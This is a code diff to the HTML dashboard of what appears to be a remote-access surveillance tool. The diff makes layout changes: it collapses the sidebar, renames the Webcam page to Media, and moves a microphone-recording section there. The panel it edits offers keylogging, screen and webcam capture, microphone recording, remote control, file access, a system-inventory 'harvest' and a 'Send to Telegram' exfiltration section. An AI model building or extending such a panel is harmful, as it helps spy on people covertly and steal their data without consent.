@@ -1545,7 +1545,7 @@ DASHBOARD_HTML = r'''
     <!-- Main App -->
     <div class="app-container" id="appContainer">
         <!-- Sidebar -->
-        <div class="sidebar" id="sidebar">
+        <div class="sidebar collapsed" id="sidebar">
             <div class="sidebar-header">
                 <div class="sidebar-logo">IGR</div>
                 <button class="sidebar-toggle" onclick="toggleSidebar()">[=]</button>
@@ -1557,7 +1557,7 @@ DASHBOARD_HTML = r'''
             <div class="sidebar-nav">
                 <div class="nav-item active" onclick="showPage('home')"><span class="nav-icon">[H]</span><span class="nav-text">Home</span></div>
                 <div class="nav-item" onclick="showPage('screen')"><span class="nav-icon">[S]</span><span class="nav-text">Screen</span></div>
-                <div class="nav-item" onclick="showPage('webcam')"><span class="nav-icon">[W]</span><span class="nav-text">Webcam</span></div>
+                <div class="nav-item" onclick="showPage('media')"><span class="nav-icon">[M]</span><span class="nav-text">Media</span></div>
                 <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">[C]</span><span class="nav-text">Control</span></div>
                 <div class="nav-item" onclick="showPage('keylogger')"><span class="nav-icon">[K]</span><span class="nav-text">Keylogger</span></div>
                 <div class="nav-item" onclick="showPage('files')"><span class="nav-icon">[F]</span><span class="nav-text">Files</span></div>
@@ -1622,8 +1622,9 @@ DASHBOARD_HTML = r'''
                 </div>
             </div>
 
-            <!-- Webcam Page -->
-            <div class="page" id="page-webcam">
+            <!-- Media Page -->
+            <div class="page" id="page-media">
+                <div class="page-grid">
                 <div class="section">
                     <div class="section-header"><div class="section-title">Webcam Stream</div><button class="btn" id="webcamBtn" onclick="toggleWebcam()">Start Stream</button></div>
                     <select id="webcamSelect" style="margin-bottom: 15px;"><option value="">Loading...</option></select>
@@ -1632,6 +1633,11 @@ DASHBOARD_HTML = r'''
                         <img id="webcamStream" src="" style="display:none;">
                         <div class="stream-badge" id="webcamBadge" style="display:none;">LIVE</div>
                     </div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">Microphone Record</div><div><button class="btn small" onclick="startMicRecord()">Record</button><button class="btn small danger" onclick="stopMicRecord()">Stop</button></div></div>
+                    <div class="log-box" id="micBox">Click Record to capture microphone audio...</div>
+                </div>
                 </div>
             </div>
 
@@ -1836,10 +1842,6 @@ DASHBOARD_HTML = r'''
                 <div class="section">
                     <div class="section-header"><div class="section-title">System Inventory</div><button class="btn small" onclick="harvestInventory()">Scan</button></div>
                     <div id="inventoryGrid" class="info-grid" style="display:none;"></div>
-                </div>
-                <div class="section">
-                    <div class="section-header"><div class="section-title">Microphone Record</div><div><button class="btn small" onclick="startMicRecord()">Record</button><button class="btn small danger" onclick="stopMicRecord()">Stop</button></div></div>
-                    <div class="log-box" id="micBox">Click Record to capture microphone audio...</div>
                 </div>
                 <div class="section">
                     <div class="section-header"><div class="section-title">Send to Telegram</div></div>
